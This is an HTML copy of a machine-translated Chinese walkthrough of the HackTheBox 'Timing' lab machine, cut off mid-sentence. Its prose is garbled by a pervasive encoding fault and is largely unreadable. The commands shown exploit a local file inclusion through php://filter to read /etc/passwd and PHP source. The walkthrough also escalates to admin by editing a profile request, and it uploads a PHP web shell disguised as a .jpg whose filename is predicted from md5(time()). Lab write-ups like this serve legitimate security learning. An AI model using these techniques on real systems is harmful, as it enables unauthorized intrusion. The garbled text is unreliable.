<html>
<head>
<title>Timing from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">æ¥è‡ªHackTheBoxçš„æ—¶åºâ€”è¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/timing-from-hackthebox-detailed-walkthrough-7671466227fd?source=collection_archive---------1-----------------------#2022-06-03">https://infosecwriteups.com/timing-from-hackthebox-detailed-walkthrough-7671466227fd?source=collection_archive---------1-----------------------#2022-06-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="e3e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å‘æ‚¨å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</p><p id="5a08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://www.hackthebox.com/home/machines/profile/421" rel="noopener ugc nofollow" target="_blank">å®šæ—¶</a>æ˜¯ç”±<a class="ae kl" href="https://www.hackthebox.com/home/users/profile/476556" rel="noopener ugc nofollow" target="_blank"> irogir </a>åœ¨<a class="ae kl" href="https://www.hackthebox.com/home" rel="noopener ugc nofollow" target="_blank"> HackTheBox </a>ä¸Šåˆ¶ä½œçš„ç®€æ˜“æ°´å¹³ä»ªã€‚å®ƒä¸»è¦å…³æ³¨åŸºäºwebå’Œshellçš„åº”ç”¨ç¨‹åºæ¼æ´ã€‚</p><h1 id="4747" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi lk"><img src="../Images/d3f6a72417d1199fe211b9a9605a9d65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*9F-Pju3p5vY679p3.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">æ¥è‡ªé»‘å®¢ç›’å­çš„è®¡æ—¶</figcaption></figure><p id="cef4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬çš„èµ·ç‚¹æ˜¯ç½‘ç«™ä¸Šç«¯å£80ä¸Šçš„ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæˆ‘ä»¬é€šè¿‡ç”¨wfuzzæŸ¥æ‰¾æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰¾åˆ°äº†ä¸€æ¡è¿›å…¥è¯¥é¡µé¢çš„é€”å¾„ã€‚ä½¿ç”¨ä¸€ä¸ªæ˜“å—æ”»å‡»çš„phpé¡µé¢ï¼Œæˆ‘ä»¬ä¼šæ³„éœ²å‡­è¯ï¼Œä»è€Œè·å¾—è®¿é—®æƒé™ã€‚è¿›ä¸€æ­¥çš„æšä¸¾å’Œä»£ç å®¡æŸ¥å…è®¸æˆ‘ä»¬å°†æˆ‘ä»¬åœ¨webåº”ç”¨ç¨‹åºä¸­çš„è§’è‰²å‡çº§ä¸ºç®¡ç†å‘˜ã€‚åœ¨é‚£é‡Œï¼Œæˆ‘ä»¬æœ‰ä¸€ç§æ–¹æ³•æ¥ä¸Šä¼ åŒ…å«ä»£ç æ‰§è¡Œçš„æ¶æ„æ–‡æ¡£ã€‚æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ç§æ–¹æ³•æ¥è·å¾—å®ƒçš„å”¯ä¸€æ–‡ä»¶åï¼Œä»è€Œå…è®¸æˆ‘ä»¬è¿œç¨‹æ‰§è¡Œæœºå™¨ä¸Šçš„å‘½ä»¤ã€‚æˆ‘ä»¬è¿‡æ»¤ä¸€ä¸ªå¤‡ä»½ï¼Œå¹¶åœ¨å…¶ä¸­æ‰¾åˆ°å‡­è¯ä»¥è·å–sshä½œä¸ºç”¨æˆ·ã€‚å‡çº§åˆ°rootæ˜¯é€šè¿‡æˆ‘ä»¬åœ¨åŒ…è£…ç›’ä¸Šæ‰¾åˆ°çš„ä¸€ä¸ªæ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºï¼Œæˆ‘ä»¬åˆ©ç”¨å®ƒå¯¹wgetçš„ä¸å®‰å…¨ä½¿ç”¨æ¥è·å¾—rootå¤–å£³ã€‚</p><h1 id="bf4f" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="842b" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/006f2342b7a2d9d7af6765e84815dc71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cgDoysoq91D5V3ynwnS2Yg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">ç›’å­çš„Nmapæ‰«æ</figcaption></figure><p id="c261" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åªæ‰“å¼€äº†ä¸¤ä¸ªç«¯å£ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ç«¯å£80ä¸Šçš„Apache:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mg"><img src="../Images/8d5611025098c14c464b4e7b45041b98.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*CFJUkYdWr3uoBnmy.png"/></div></div></figure><h1 id="950e" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Gobusteræšä¸¾</h1><p id="642a" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æˆ‘ä»¬æœ‰ä¸€ä¸ªç™»å½•æ¡†ï¼Œä½†æ²¡æœ‰åˆ«çš„ã€‚æˆ‘å°è¯•äº†ä¸€äº›æ˜¾è€Œæ˜“è§çš„å‡­è¯ï¼Œä½†æ²¡æœ‰å¾—åˆ°ä»»ä½•åœ°æ–¹ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬è¯•è¯•gobuster:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mh"><img src="../Images/cc281469af6a58e7f3ab561cd29905d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wby1XnigWwAuA9l1VVBaqg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">gobusteræ‰«æå­æ–‡ä»¶å¤¹</figcaption></figure><p id="aa1d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ²¡æœ‰å¤ªå¤šçº¿ç´¢ï¼Œæ‰€ä»¥æˆ‘è¯•ç€å¯»æ‰¾å¸¦æœ‰phpæ‰©å±•åçš„æ–‡ä»¶ï¼Œå‘ç°äº†è¿™ä¸ª:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mi"><img src="../Images/ce68f059a419e9ddd76f46c760779563.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AgQJKlq5S6KtOsWSBW1QsQ.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">gobusteræ‰«æphpæ–‡ä»¶</figcaption></figure><h1 id="e764" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Wfuzz</h1><p id="50ac" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æœ‰è¶£çš„æ˜¯ï¼Œimage.phpçš„æ–‡ä»¶æ²¡æœ‰åƒå…¶ä»–æ–‡ä»¶ä¸€æ ·é‡å®šå‘åˆ°login.phpã€‚æˆ‘è¯•ç€å¼„æ¨¡ç³Šï¼ŒèŠ±äº†æˆ‘ä¸å°‘æ—¶é—´ï¼Œä½†æœ€ç»ˆæˆ‘å¾—åˆ°äº†è¿™ä¸ª:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mj"><img src="../Images/31534af4f4549e854748c16bf7186f39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DKDSDZ815h-aMvJUQYWbCg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">æ¨¡ç³Šå‚æ•°</figcaption></figure><h1 id="4397" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">è½¬å‚¨å¯†ç </h1><p id="6513" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">é€šè¿‡ä½¿ç”¨imgå‚æ•°å’Œfuzzingï¼Œæˆ‘å¾—åˆ°äº†ä¸€äº›25ä¸ªå­—ç¬¦çš„å“åº”ã€‚è¿™å‘Šè¯‰æˆ‘ä»¬webæœåŠ¡å™¨æ­£åœ¨åšå‡ºå“åº”ã€‚è®©æˆ‘ä»¬å°è¯•è·å–passwdæ–‡ä»¶:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mk"><img src="../Images/0853aa3ab647251f6d1a7b73807fbab4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5U_lL--zjDDk5XchKBFW2A.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">å°è¯•ç”¨curlä¸‹è½½å¯†ç æ–‡ä»¶</figcaption></figure><p id="c7c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¥½äº†ï¼Œæˆ‘ä»¬æœ‰è¿›å±•äº†ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦å°è¯•ç»•è¿‡é‚£ä¸ªè¿‡æ»¤å™¨ã€‚æˆ‘ç”¨äº†<a class="ae kl" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ï¼Œè¿™æ˜¯æˆ‘åœ¨èµé‡‘çŒäººç›’å­<a class="ae kl" href="https://pencer.io/ctf/ctf-htb-bountyhunter/#base64-encoded-payload" rel="noopener ugc nofollow" target="_blank">ä¸Šç”¨çš„ä¸œè¥¿</a>:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ml"><img src="../Images/69e567b072709db771eb2dd03189211b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5idYKETuOle4F-gIcBhnOQ.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">ç”¨curlæŠ“å–å¯†ç æ–‡ä»¶</figcaption></figure><p id="152e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯å¯è¡Œçš„ï¼Œå“åº”æ˜¯base64ç¼–ç çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è§£ç å¹¶ä½¿ç”¨grepæ¥ç»™å‡ºå¯ä»¥ç™»å½•çš„å¸æˆ·:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mm"><img src="../Images/0a9c5d9a768fb680d61aa45057287fa9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uh-XrWilNK9TlAKrmNcHyQ.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">ä½¿ç”¨curlå’Œbase64è§£ç æŠ“å–passwdæ–‡ä»¶</figcaption></figure><h1 id="a017" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">ç®€å•çš„WebAppç™»å½•</h1><p id="4ad2" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æˆ‘ä»¬æœ‰ä¸€ä¸ªå«aaronçš„ç”¨æˆ·ã€‚å›åˆ°æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„åˆå§‹ç™»å½•æ¡†ï¼Œç°åœ¨ä½¿ç”¨ç”¨æˆ·åç™»å½•å¾ˆç®€å•:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mn"><img src="../Images/3a46ffb3e437df1299097dc613a58450.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*FUUK5RAGIUQv7H9S.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">ç®€å•çš„WebAppç™»å½•</figcaption></figure><p id="1170" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬åœ¨è¿™é‡Œç»“æŸ:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mo"><img src="../Images/60994e92ef01adbd8c6942718aa66c1a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*pXBYB8C8ESSgD7Md.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">ä»¥ç”¨æˆ·2èº«ä»½ç™»å½•</figcaption></figure><p id="b26e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬ä¸ç¡®å®šæ­¤æ—¶æˆä¸ºç”¨æˆ·2çš„æ„ä¹‰ä½•åœ¨ï¼Œè€Œä¸”ä¸€æ—¦ç™»å½•ï¼Œæ‚¨å°±ä¸èƒ½åšä»»ä½•å…¶ä»–äº‹æƒ…äº†ã€‚å›åˆ°æˆ‘ä»¬çš„gobusterè¾“å‡ºï¼Œæˆ‘å¾—åˆ°äº†upload.phpæ–‡ä»¶:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="4698" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# curl 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=upload.php' | base64 -d</span></pre><h1 id="30f6" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">ä»£ç å®¡æŸ¥</h1><p id="30b1" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æµè§ˆä»£ç ï¼Œå¾ˆå®¹æ˜“çœ‹å‡ºå®ƒåšäº†ä»€ä¹ˆã€‚å®ƒè·å–ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ£€æŸ¥å®ƒæ˜¯å¦æœ‰. jpgæ‰©å±•åï¼Œå¹¶å°†å…¶åç§°å­˜å‚¨åœ¨$file_nameä¸­ã€‚ç„¶åï¼Œå®ƒé€šè¿‡è·å–å½“å‰æ—¶é—´çš„md5æ•£åˆ—å€¼å¹¶å°†å…¶ä¸æ–‡ä»¶åç›¸ç»“åˆæ¥åˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„æ•£åˆ—å€¼ã€‚ç„¶åï¼Œå®ƒå°†æ–‡ä»¶å­˜å‚¨åœ¨/images/uploadsä¸­ã€‚è„šæœ¬ä¸­æœ‰ä¸€ä¸ªéœ€è¦ç†è§£çš„åœ°æ–¹ï¼Œå¦åˆ™ä½ å°†ä¼šè¯•å›¾ç¡®å®šå·²ç»åˆ›å»ºçš„æ–‡ä»¶åã€‚</p><p id="e42f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æŸ¥çœ‹æ–‡ä»¶çš„ç¬¬ä¸€éƒ¨åˆ†:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="be5f" class="mu kn iq mq b gy mv mw l mx my">&lt;?php<br/>include("admin_auth_check.php");<br/>$upload_dir = "images/uploads/";<br/><br/>if (!file_exists($upload_dir)) {<br/>    mkdir($upload_dir, 0777, true);<br/>}<br/><br/>$file_hash = uniqid();<br/><br/>$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);<br/>$target_file = $upload_dir . $file_name;</span></pre><p id="8724" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¯·æ³¨æ„ï¼Œæœ‰ä¸€ä¸ªåä¸º$file_hashçš„å˜é‡æ˜¯ç”¨uniqid()è®¾ç½®çš„å€¼åˆ›å»ºçš„ã€‚è¿™ç¯‡æ–‡ç« è§£é‡Šäº†è¿™ä¸ªå‡½æ•°æ˜¯åšä»€ä¹ˆçš„ï¼Œä½†æœ¬è´¨ä¸Šå®ƒå°±åƒtime()ï¼Œä½†ä»¥å¾®ç§’ä¸ºå•ä½ï¼Œæ‰€ä»¥æ˜¯ä¸€ä¸ªæ›´å¤§çš„å€¼ã€‚é‡è¦çš„ä¸€ç‚¹æ˜¯:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="b94e" class="mu kn iq mq b gy mv mw l mx my">md5('$file_hash' . time())</span></pre><p id="deb3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨PHPä¸­ï¼Œå•å¼•å·å’ŒåŒå¼•å·å¯¹å­—ç¬¦ä¸²çš„ä½œç”¨ä¸åŒã€‚è§<a class="ae kl" href="https://www.geeksforgeeks.org/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php/" rel="noopener ugc nofollow" target="_blank">è¿™ç¯‡</a>æ–‡ç« ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šä»–$file_hashå˜é‡çš„å€¼æ˜¯ä»æ¥ä¸ç”¨çš„ã€‚</p><p id="2374" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬è¿˜çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­åŒ…å«å¦ä¸€ä¸ªåä¸ºadmin_auth_check.phpçš„æ–‡ä»¶ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="e1fb" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# curl 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php' | base64 -d<br/><br/>&lt;?php<br/>include_once "auth_check.php";<br/><br/>if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {<br/>    echo "No permission to access this panel!";<br/>    header('Location: ./index.php');<br/>    die();<br/>}<br/>?&gt;</span></pre><p id="9b8a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥æ–‡ä»¶æ­£åœ¨æ£€æŸ¥ä¼šè¯è§’è‰²çš„å€¼ã€‚å¦‚æœå®ƒä¸ç­‰äº1ï¼Œé‚£ä¹ˆä½ æ²¡æœ‰è®¿é—®é¢æ¿çš„æƒé™ã€‚æˆ‘ä»¬è¿˜ä¸çŸ¥é“é‚£æ˜¯ä»€ä¹ˆæ„æ€ï¼</p><h1 id="ac1d" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">WebAppç®¡ç†å‘˜è®¿é—®</h1><p id="d717" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">å›åˆ°æˆ‘ä»¬çš„webæµè§ˆå™¨ï¼Œæˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ªè®¤è¯ä¸ºaaronçš„ä¼šè¯ã€‚å¦‚æœæ‚¨ç‚¹å‡»é¡¶éƒ¨çš„â€œç¼–è¾‘ä¸ªäººèµ„æ–™â€é“¾æ¥ï¼Œæ‚¨ä¼šçœ‹åˆ°:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mz"><img src="../Images/c002952fca0cba7513a0a01912e785d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*3io637USPqKb-wKA.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">ç¼–è¾‘ç”¨æˆ·çš„ä¸ªäººèµ„æ–™</figcaption></figure><p id="0a74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¯¥æ‰“å—äº†ï¼Œçœ‹çœ‹èƒŒæ™¯ä¸­å‘ç”Ÿäº†ä»€ä¹ˆã€‚ä¸€æ—¦ä½ è®¾ç½®äº†Burpæ‹¦æˆªè¯·æ±‚å¹¶ä¸”ä½ çš„æµè§ˆå™¨è®¾ç½®äº†ä½¿ç”¨å®ƒï¼Œç‚¹å‡»ç½‘é¡µä¸Šçš„è“è‰²æ›´æ–°æŒ‰é’®ã€‚æˆ‘ä»¬æ‹¦æˆªäº†é‚®ä»¶:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi na"><img src="../Images/4801261d42610dfbe55a8be7f6156912.png" data-original-src="https://miro.medium.com/v2/resize:fit:1198/format:webp/0*xuQSL6RjAwhlsl2w.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">æ‰“å—æ‹¦æˆªç”¨æˆ·</figcaption></figure><p id="44f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨æœ«å°¾æ·»åŠ æˆ‘ä»¬çš„æ–°è§’è‰²:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/8d3bd1fbe174ca0671f6e5fa68d85a1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1202/format:webp/0*NfV9SUysSwXApL-k.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">æ‰“å—æ”¹å˜ç”¨æˆ·çš„è§’è‰²</figcaption></figure><p id="1202" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è½¬å‘åˆ°æœåŠ¡å™¨ï¼Œç„¶ååˆ‡æ¢å›æµè§ˆå™¨:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/f3765fa3274d7a69a4b17e4758f50b46.png" data-original-src="https://miro.medium.com/v2/resize:fit:836/format:webp/0*StLibNhHx9_lo8w4.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">ä¸ªäººèµ„æ–™å·²æ›´æ–°</figcaption></figure><p id="b29e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬çš„ä¸ªäººèµ„æ–™å·²æ›´æ–°ï¼Œç°åœ¨åˆ·æ–°æ‚¨çš„æµè§ˆå™¨ä»¥æŸ¥çœ‹æˆ‘ä»¬æœ‰ä¸€ä¸ªåä¸ºç®¡ç†é¢æ¿çš„æ–°é€‰é¡¹ï¼Œå•å‡»è¯¥é€‰é¡¹å¯è¿›å…¥æ­¤å¤„:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/ed503f1e2e241c4648d746362e00f3bc.png" data-original-src="https://miro.medium.com/v2/resize:fit:930/format:webp/0*ZCPlPdfGwSxhGtsV.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">è®¿é—®ç®¡ç†é¢æ¿</figcaption></figure><h1 id="8794" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Webå¤–å£³</h1><p id="6a75" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†å›¾ç‰‡ä¸Šä¼ åŒºåŸŸï¼Œå®ƒä½¿ç”¨äº†æˆ‘ä»¬ä¹‹å‰çœ‹è¿‡çš„PHPæ–‡ä»¶ã€‚å¯ä»¥è‚¯å®šè¿™å°†æ˜¯æˆ‘ä»¬è·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ–¹æ³•ã€‚è®©æˆ‘ä»¬ä»ä¸€ä¸ªç®€å•çš„web shellå¼€å§‹ã€‚æˆ‘ä»¬ä»ä»£ç å®¡æŸ¥ä¸­çŸ¥é“ï¼Œæœ‰æ–‡ä»¶æ‰©å±•åæ£€æŸ¥ï¼Œä½†æ²¡æœ‰æ–‡ä»¶å†…å®¹æ£€æŸ¥ã€‚æˆ‘ä»¬å¯ä»¥åƒè¿™æ ·è½»æ¾åœ°ç»•è¿‡æ£€æŸ¥:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="22e3" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# cat pencer.jpg<br/>&lt;?php system($_GET[cmd]);?&gt;</span></pre><p id="cee5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬ä»¥å‰å·²ç»åœ¨å°¼å°¼å¾®å’ŒT2é”»ç‚‰ä¸­ä½¿ç”¨è¿‡å‡ æ¬¡äº†ã€‚ç„¶è€Œï¼Œè¿™é‡Œç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œå› ä¸ºç”Ÿæˆçš„æ–‡ä»¶åå‰é¢è¿˜æœ‰ä¸€ä¸ªå½“å‰æ—¶é—´çš„md5æ•£åˆ—ã€‚</p><p id="11df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥åˆ›å»ºè‡ªå·±ç®€å•çš„æ–‡ä»¶åç”Ÿæˆå™¨æ¥å¸®åŠ©æ‚¨ã€‚è¿™å°±æ˜¯PHPæ–‡ä»¶æ­£åœ¨åšçš„äº‹æƒ…:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="fc08" class="mu kn iq mq b gy mv mw l mx my">$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);</span></pre><p id="d108" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®©æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹æˆ‘ä»¬è‡ªå·±çš„ç‰ˆæœ¬:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="e521" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing]<br/>â””â”€# date<br/>Wed 22 Dec 17:13:27 GMT 2021</span></pre><p id="3d8e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½¿ç”¨å½“å‰æ—¶é—´:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="be84" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing]<br/>â””â”€# php -a<br/>Interactive mode enabled<br/>php &gt; echo (md5('$file_hash' . strtotime('Wed 22 Dec 17:13:27 GMT 2021')) . '_pencer.jpg');<br/>01c656c2e2adb93593117cb1b3d12808_pencer.jpg</span></pre><p id="736d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å› æ­¤ï¼Œä½¿ç”¨äº¤äº’å¼phpæ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥ä»æˆ‘ä»¬æ£€æŸ¥è¿‡çš„ä»£ç 